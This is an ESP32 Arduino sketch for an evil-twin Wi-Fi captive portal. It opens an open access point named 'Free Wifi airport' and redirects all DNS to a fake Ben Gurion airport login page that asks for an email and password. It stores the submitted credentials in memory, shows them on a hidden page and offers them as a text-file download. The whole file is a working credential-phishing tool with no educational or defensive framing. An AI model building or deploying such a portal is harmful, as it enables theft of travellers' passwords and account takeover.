#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SPIFFS.h>
#include <base64.h>

const char *ssid = "Free Wifi airport";   // Name of the WiFi network
const char *password = NULL;       // No password

DNSServer dnsServer;
WebServer server(80);              // Create a WebServer object that listens on port 80

// Structure to hold login data
struct LoginData {
  String username;
  String password;
};

// Array to store login data
LoginData loginDataArray[10];
int loginDataIndex = 0;

void handleRoot() {
  server.sendHeader("Location", "/redirect-page");  // Redirect to "/redirect-page"
  server.send(301);
}

void handleRedirectPage() {
    // HTML content for the redirect page (airport login style)
    String htmlContent = "<!DOCTYPE html>\
                        <html>\
                        <head>\
                            <title>Airport Wifi Login</title>\
                            <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\
                            <style>\
                                body {\
                                    font-family: Arial, sans-serif;\
                                    background-color: #f2f2f2;\
                                    margin: 0;\
                                    padding: 0;\
                                }\
                                .container {\
                                    max-width: 600px;\
                                    margin: 50px auto;\
                                    background-color: #fff;\
                                    padding: 20px;\
                                    border-radius: 8px;\
                                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);\
                                }\
                                h1 {\
                                    text-align: center;\
                                    color: #333;\
                                }\
                                label {\
                                    display: block;\
                                    margin-bottom: 8px;\
                                    color: #666;\
                                }\
                                input[type=\"text\"],\
                                input[type=\"password\"] {\
                                    width: 100%;\
                                    padding: 10px;\
                                    margin-bottom: 20px;\
                                    border: 1px solid #ccc;\
                                    border-radius: 4px;\
                                    box-sizing: border-box;\
                                }\
                                button[type=\"submit\"] {\
                                    width: 100%;\
                                    padding: 10px;\
                                    background-color: #007bff;\
                                    color: #fff;\
                                    border: none;\
                                    border-radius: 4px;\
                                    cursor: pointer;\
                                }\
                                button[type=\"submit\"]:hover {\
                                    background-color: #0056b3;\
                                }\
                                img {\
                                    display: block;\
                                    margin: 0 auto;\
                                    max-width: 100%;\
                                    height: auto;\
                                }\
                                .about-us {\
                                    margin-top: 50px;\
                                    text-align: center;\
                                }\
                                .about-us h2 {\
                                    margin-bottom: 10px;\
                                }\
                                .about-us ul {\
                                    list-style: none;\
                                    padding: 0;\
                                    text-align: center;\
                                }\
                                .about-us li {\
                                    display: inline;\
                                    margin-right: 10px;\
                                }\
                                .about-us li:last-child {\
                                    margin-right: 0;\
                                }\
                                .about-us a {\
                                    text-decoration: none;\
                                    color: #007bff;\
                                }\
                            </style>\
                        </head>\
                        <body>\
                            <div class=\"container\">\
                                <h1>Airport Login</h1>\
                                <img src=\"http://192.168.4.1/image.jpg\" alt=\"Airport Logo\">\
                                <p style=\"text-align: center;\">Before you can use the WiFi, you must register.</p>\
                                <form action=\"/login\" method=\"post\">\
                                    <label for=\"username\">Email:</label>\
                                    <input type=\"text\" id=\"username\" name=\"username\" required pattern=\"[^@]+@[^@]+\\.[a-zA-Z]{2,}\">\
                                    <label for=\"password\">Password:</label>\
                                    <input type=\"password\" id=\"password\" name=\"password\" minlength=\"4\" required>\
                                    <label for=\"security_question\">Security Question:</label>\
                                    <select id=\"security_question\" name=\"security_question\" required>\
                                        <option value=\"\">Select a security question</option>\
                                        <option value=\"color\">What is your favorite color?</option>\
                                        <option value=\"pet\">What is the name of your first pet?</option>\
                                        <option value=\"city\">In which city were you born?</option>\
                                    </select>\
                                    <input type=\"text\" id=\"security_answer\" name=\"security_answer\" placeholder=\"Answer\" required>\
                                    <button type=\"submit\">Register</button>\
                                </form>\
                            </div>\
                            <div class=\"about-us\">\
                                <h2>About Us</h2>\
                                <ul>\
                                    <li><a href=\"#\">About IAA</a></li>\
                                    <li><a href=\"#\">Term of Use</a></li>\
                                    <li><a href=\"#\">Declaration of Accessibility</a></li>\
                                    <li><a href=\"#\">Jobs</a></li>\
                                    <li><a href=\"#\">Information for Passengers during the Corona Period</a></li>\
                                    <li><a href=\"#\">Contact Us</a></li>\
                                    <li><a href=\"#\">Public Inquiries</a></li>\
                                    <li><a href=\"#\">Flight Intelligence</a></li>\
                                    <li><a href=\"#\">We are on Instagram</a></li>\
                                    <li><a href=\"#\">Ben Gurion App - App Store</a></li>\
                                    <li><a href=\"#\">Ben Gurion App - Google Play</a></li>\
                                </ul>\
                            </div>\
                        </body>\
                        </html>";

    server.send(200, "text/html", htmlContent);
}





void handleLogin() {
  // Retrieve form data from POST request
  if (server.hasArg("username") && server.hasArg("password")) {
    String usernameValue = server.arg("username");
    String passwordValue = server.arg("password");
    
    // Store the login data in the array
    loginDataArray[loginDataIndex].username = usernameValue;
    loginDataArray[loginDataIndex].password = passwordValue;
    loginDataIndex = (loginDataIndex + 1) % 10; // Wrap around if we reach the end

    // Redirect back to current
    server.sendHeader("Location", "/redirect-page");
    server.send(301);
  } else {
    // If username or password is missing, redirect back to redirect page
    server.sendHeader("Location", "/redirect-page");
    server.send(301);
  }
}

void handleHiddenPage() {
    // Get the number of connected clients
    int connectedClients = WiFi.softAPgetStationNum();

    // HTML content for the hidden page
    String htmlContent = "<!DOCTYPE html>\
                        <html>\
                        <head>\
                            <title>Hidden Page</title>\
                            <style>\
                                body {\
                                    font-family: Arial, sans-serif;\
                                    background-color: #f2f2f2;\
                                    margin: 0;\
                                    padding: 20px;\
                                }\
                                h1 {\
                                    color: #333;\
                                }\
                                table {\
                                    width: 100%;\
                                    border-collapse: collapse;\
                                    margin-bottom: 20px;\
                                }\
                                th, td {\
                                    border: 1px solid #ddd;\
                                    padding: 8px;\
                                    text-align: left;\
                                }\
                                th {\
                                    background-color: #007bff;\
                                    color: #fff;\
                                }\
                                tr:nth-child(even) {\
                                    background-color: #ffffff;\
                                }\
                                tr:nth-child(odd) {\
                                    background-color: #f2f2f2;\
                                }\
                                a {\
                                    color: #007bff;\
                                    text-decoration: none;\
                                }\
                                a:hover {\
                                    text-decoration: underline;\
                                }\
                                .dot {\
                                    height: 12px;\
                                    width: 12px;\
                                    background-color: green;\
                                    border-radius: 50%;\
                                    display: inline-block;\
                                }\
                            </style>\
                            <script>\
                                function refreshPage() {\
                                    location.reload();\
                                }\
                                setInterval(refreshPage, 3000); // Refresh every 3 seconds\
                            </script>\
                        </head>\
                        <body>\
                            <h1>Stored Login Data</h1>\
                            <p><span class=\"dot\"></span> Connected Clients: " + String(connectedClients) + "</p>\
                            <table>\
                                <thead>\
                                    <tr>\
                                        <th>Email</th>\
                                        <th>Password</th>\
                                    </tr>\
                                </thead>\
                                <tbody>";

    // Display stored login data
    for (int i = 0; i < 10; i++) {
        htmlContent += "<tr>\
                            <td>" + loginDataArray[i].username + "</td>\
                            <td>" + loginDataArray[i].password + "</td>\
                        </tr>";
    }

    htmlContent += "</tbody>\
                    </table>";

    // Add a download link for the data
    htmlContent += "<p><a href=\"/download\" style=\"display: inline-block; padding: 10px 20px; background-color: #007bff; color: #fff; text-decoration: none; border-radius: 5px; transition: background-color 0.3s;\">Download Data as Text File</a></p>";

    htmlContent += "</body>\
                  </html>";

    server.send(200, "text/html", htmlContent);
}




void handleDownload() {
    // Prepare the content for the text file
    String fileContent = "Email\tPassword\n";
    for (int i = 0; i < 10; i++) {
        fileContent += loginDataArray[i].username + "\t" + loginDataArray[i].password + "\n";
    }

    // Set the appropriate headers
    server.sendHeader("Content-Disposition", "attachment;filename=login_data.txt");
    server.send(200, "text/plain", fileContent);
}



void serveImage() {
  Serial.println("Serving image...");

  // Open the image file
  File file = SPIFFS.open("/data/plane.jpg", "r");

  if (!file || file.isDirectory()) {
    Serial.println("Error opening image file!");
    if (file.isDirectory()) {
      Serial.println("It's a directory!");
    }
    else {
      Serial.println("File not found!");
    }
    server.send(404, "text/plain", "File not found");
    return;
  }

  // Serve the image file with MIME type "image/jpeg"
  server.streamFile(file, "image/jpeg");

  // Close the file after serving
  file.close();

  Serial.println("Image served successfully");
}




void handleNotFound() {
  server.sendHeader("Location", "/redirect-page");
  server.send(301);
}

void setup() {
  Serial.begin(115200);
  
  if (!SPIFFS.begin(true)) {
    Serial.println("SPIFFS initialization failed!");
    return;
  }

  

  // Initialize WiFi as Access Point
  WiFi.softAP(ssid, password);

  Serial.println("Access Point Started");
  Serial.print("IP Address: ");
  Serial.println(WiFi.softAPIP());

  // Configure DNS server to intercept DNS requests
  dnsServer.start(53, "*", WiFi.softAPIP());

  // Route setup
  server.on("/", HTTP_GET, handleRoot);            // Redirect root URL to "/redirect-page"
  server.on("/redirect-page", HTTP_GET, handleRedirectPage);  // Handle "/redirect-page"
  server.on("/login", HTTP_POST, handleLogin); // Handle POST requests to "/login"
  server.on("/hidden-page", HTTP_GET, handleHiddenPage); // Handle GET requests to "/hidden-page"
  server.on("/download", HTTP_GET, handleDownload);
  server.on("/img", HTTP_GET, serveImage);

  server.onNotFound(handleNotFound); // Redirect all other requests to "/redirect-page"
  
  server.begin();  // Start server
}

void loop() {
  dnsServer.processNextRequest();  // Process DNS requests
  server.handleClient();  // Handle client requests
}